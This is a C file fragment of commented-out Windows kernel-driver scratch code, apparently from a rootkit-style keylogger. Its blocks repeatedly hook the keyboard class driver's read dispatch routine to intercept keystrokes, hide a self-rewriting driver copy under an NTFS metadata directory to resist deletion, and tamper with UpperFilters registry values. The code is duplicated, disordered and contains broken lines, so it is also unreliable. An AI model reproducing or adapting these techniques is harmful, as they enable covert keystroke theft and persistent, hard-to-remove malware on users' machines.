//	//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	//	if (!NT_SUCCESS(ntstatus)) {
//	//		DbgPrint("RewriteBogusFile: ZwWriteFile 0x%lX", ntstatus);
//	//	}
//	//	else{
//	//		ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
//	//	}
//	//	ZwClose(hDrvFile);
//	//}
//	//else{
//	//	DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	//}
//
//
//	UNICODE_STRING uDirectoryToMonitor;
//	RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\C:\\$Extend\\$RmMetadata");
//	InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//	ntstatus = ZwOpenFile(&g_pRunTimeInfo->hBogusFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->bogusFileIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
//	if (!NT_SUCCESS(ntstatus)){
//		DbgPrint("RewriteBogusFile: Failed to open bogus directory for deletion prevention! 0x%lX", ntstatus);
//		return;
//	}
//	DbgPrint("RewriteBogusFile: Opened bogus directory for deletion prevention! 0x%lX", ntstatus);
//
//	ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hBogusFile, NULL, g_pRunTimeInfo->fpBogusFileRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->bogusFileIoStatusBlock, &g_pRunTimeInfo->bogusFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), 0x00000002, FALSE);
//	if (!NT_SUCCESS(ntstatus)){
//		DbgPrint("RewriteBogusFile: Failed to rearm bogus directory notify routine! 0x%lX", ntstatus);
//		ZwClose(g_pRunTimeInfo->hBogusFile);
//		return;
//	}
//	DbgPrint("RewriteBogusFile: Armed bogus directory notification routine! 0x%lX", ntstatus);
//}
//



//PatchKbd(NULL);
//#include "payload.h"
//
//#define SMILEY_CHAR1 41
//#define SMILEY_CHAR2 68
//#define RANDOM_INTERVAL (-5432109)
//LARGE_INTEGER systemTime;
//LARGE_INTEGER localTime;
//LARGE_INTEGER allocationSize;
//LARGE_INTEGER timeout;
//timeout
//allocationSize.QuadPart = 0x1000;
//char dispVar1 = 0;
//char dispVar2 = 0;
//BOOL flag = FALSE;
//interval.QuadPart = RANDOM_INTERVAL;
//allocationSize.QuadPart = 0x0;
//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services", L"UpperFilters", REG_BINARY, NULL, 0);
//RtlDeleteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services", L"UpperFilters");
//while (0x0 == g_pRunTimeInfo->okToContinue){}
//RtlDeleteRegistryValue(RTL_REGISTRY_ABSOLUTE, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e96b-e325-11ce-bfc1-08002be10318}", L"UpperFilters");
//ntstatus = ZwOpenFile(&hLogFile, DELETE, &objectAttributes, &ioStatusBlock, FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_SHARE_DELETE, FILE_NON_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_NONALERT);
//KeQuerySystemTime(&systemTime);
//ExSystemTimeToLocalTime(&systemTime, &localTime);
//flag = !flag;
//dispVar1 = (flag) ? SMILEY_CHAR1 : SMILEY_CHAR2;
//dispVar2 = (flag) ? SMILEY_CHAR2 : SMILEY_CHAR1;
//hControlFile = INVALID_HANDLE_VALUE;
//if (NULL != hLogFile){
//hLogFile = INVALID_HANDLE_VALUE;
//}
//if (NULL != irpStack->CompletionRoutine){
//fill in kData structure with info from IRP   
//UNICODE_STRING uKbdDrvName;
//NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//PDRIVER_OBJECT pKbdDrvObj = NULL;
//PDEVICE_OBJECT pKbdDevObj = NULL;
//KIRQL oldIrql;

/////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//while (!NT_SUCCESS(ntstatus)){
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//}



//pKbdDevObj = pKbdDrvObj->DeviceObject;
//while (NULL == pKbdDevObj){
//	pKbdDevObj = pKbdDrvObj->DeviceObject;
//}

//if (0x0 == g_pKbdHookInfo->wasPatched){
//	g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//	g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//}

//if (NULL == patchKbd){
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpOriginalFunction;
//	//g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//	KeLowerIrql(oldIrql);
//}
//else{
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	//g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//	KeLowerIrql(oldIrql);
//}
//ObfDereferenceObject(pKbdDrvObj);
//if (PASSIVE_LEVEL != KeGetCurrentIrql()){
//	DbgPrint("wrong irql!");
//	return STATUS_UNSUCCESSFUL;
//}
//UNICODE_STRING uKbdDrvName;
//////PEPROCESS pEprocess;
////PDEVICE_OBJECT pKbdDevObj = NULL;
//////PDRIVER_OBJECT pLowerKbdDrvObj = NULL;
//////interval.QuadPart = -1500000;

//////InitializeListHead(&(g_pKbdHookInfo->queueListHead));
//////KeInitializeSpinLock(&(g_pKbdHookInfo->queueSpinLock));
//////KeInitializeSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, MAXLONG);

///////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//////ULONG deviceCount = 0;
//////for (;;){
//////	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//////	if (NT_SUCCESS(ntstatus)){
//////		break;
//////	}
//////	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//////}
////while (!NT_SUCCESS(ntstatus)){
//if (PASSIVE_LEVEL == KeGetCurrentIrql()){
//	DbgPrint("wrong irql!");
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//	if (!NT_SUCCESS(ntstatus)){
//		return ntstatus;
//	}
//	//return STATUS_UNSUCCESSFUL;
//}
//else{
//	if (NULL ==)
//}

////}

//pKbdDevObj = pKbdDrvObj->DeviceObject;
//if(NULL == pKbdDrvObj->DeviceObject){
//	//pKbdDevObj = pKbdDrvObj->DeviceObject;
//	return ntstatus;
//}
//
//UNICODE_STRING uKbdDrvName;
//NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//PDRIVER_OBJECT pKbdDrvObj = NULL;
//PDEVICE_OBJECT pKbdDevObj = NULL;
//KIRQL oldIrql;

/////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//while (!NT_SUCCESS(ntstatus)){
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//}



//pKbdDevObj = pKbdDrvObj->DeviceObject;
//while (NULL == pKbdDevObj){
//	pKbdDevObj = pKbdDrvObj->DeviceObject;
//}

//if (0x0 == g_pKbdHookInfo->wasPatched){
//	g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//	g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//}

//if (NULL == patchKbd){
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpOriginalFunction;
//	//g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//	KeLowerIrql(oldIrql);
//}
//else{
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	//g_pKbdHookInfo->wasPatched = 0xFFFFFFFF;
//	KeLowerIrql(oldIrql);
//}
//ObfDereferenceObject(pKbdDrvObj);
//UNICODE_STRING uKbdDrvName;
////PEPROCESS pEprocess;
//NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//if (PASSIVE_LEVEL != KeGetCurrentIrql()){
//	DbgPrint("wrong irql!");
//	return;
//}
////PDEVICE_OBJECT pKbdDevObj = NULL;
//////PDRIVER_OBJECT pLowerKbdDrvObj = NULL;
//////interval.QuadPart = -1500000;

//////InitializeListHead(&(g_pKbdHookInfo->queueListHead));
//////KeInitializeSpinLock(&(g_pKbdHookInfo->queueSpinLock));
//////KeInitializeSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, MAXLONG);

///////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//////ULONG deviceCount = 0;
//////for (;;){
//////	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//////	if (NT_SUCCESS(ntstatus)){
//////		break;
//////	}
//////	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//////}
//ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//if (!NT_SUCCESS(ntstatus)){
//	return;
//}

//pKbdDevObj = pKbdDrvObj->DeviceObject;
//g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, &timeout);
//KeDelayExecutionThread(KernelMode, FALSE, &timeout);
//PrepOnShutdown(NULL);
//break;
//DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//void UnpatchKbd(PDRIVER_OBJECT pKbdDrvObj){
//	KIRQL oldIrql;
//
//	///Try to directly access the keyboard class driver
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	g_pKbdHookInfo->pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpOriginalFunction;
//	g_pKbdHookInfo->pKbdDrvObj = NULL;
//	//g_pKbdHookInfo->isPatched = 0x0;
//	KeLowerIrql(oldIrql);
//}

//PatchOrUnpatchKbd(TRUE);
//UNICODE_STRING uKbdDrvName;
//////PEPROCESS pEprocess;
//NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//PDRIVER_OBJECT pKbdDrvObj = NULL;
//PDEVICE_OBJECT pKbdDevObj = NULL;
//////PDRIVER_OBJECT pLowerKbdDrvObj = NULL;
//////interval.QuadPart = -1500000;

//////InitializeListHead(&(g_pKbdHookInfo->queueListHead));
//////KeInitializeSpinLock(&(g_pKbdHookInfo->queueSpinLock));
//////KeInitializeSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, MAXLONG);

///////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//////ULONG deviceCount = 0;
//////for (;;){
//////	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//////	if (NT_SUCCESS(ntstatus)){
//////		break;
//////	}
//////	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//////}
//while (!NT_SUCCESS(ntstatus)){
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//}

//pKbdDevObj = pKbdDrvObj->DeviceObject;
//while (NULL == pKbdDevObj){
//	pKbdDevObj = pKbdDrvObj->DeviceObject;
//}

//KIRQL oldIrql;
//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//KeLowerIrql(oldIrql);

////PatchOrUnpatchKbd(FALSE);
//UNICODE_STRING uKbdDrvName;
//////PEPROCESS pEprocess;
//NTSTATUS ntstatus = STATUS_UNSUCCESSFUL;
//PDRIVER_OBJECT pKbdDrvObj = NULL;
//PDEVICE_OBJECT pKbdDevObj = NULL;
//////PDRIVER_OBJECT pLowerKbdDrvObj = NULL;
//////interval.QuadPart = -1500000;

//////InitializeListHead(&(g_pKbdHookInfo->queueListHead));
//////KeInitializeSpinLock(&(g_pKbdHookInfo->queueSpinLock));
//////KeInitializeSemaphore(&(g_pKbdHookInfo->queueSemaphore), 0, MAXLONG);

///////Try to directly access the keyboard class driver
//RtlInitUnicodeString(&uKbdDrvName, L"\\Driver\\kbdclass");
//////ULONG deviceCount = 0;
//////for (;;){
//////	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//////	if (NT_SUCCESS(ntstatus)){
//////		break;
//////	}
//////	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//////}
//while (!NT_SUCCESS(ntstatus)){
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//}

//pKbdDevObj = pKbdDrvObj->DeviceObject;
//while (NULL == pKbdDevObj){
//	pKbdDevObj = pKbdDrvObj->DeviceObject;
//}
//KIRQL oldIrql;
//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpOriginalFunction;
//KeLowerIrql(oldIrql);
//PatchOrUnpatchKbd2(NULL);

//}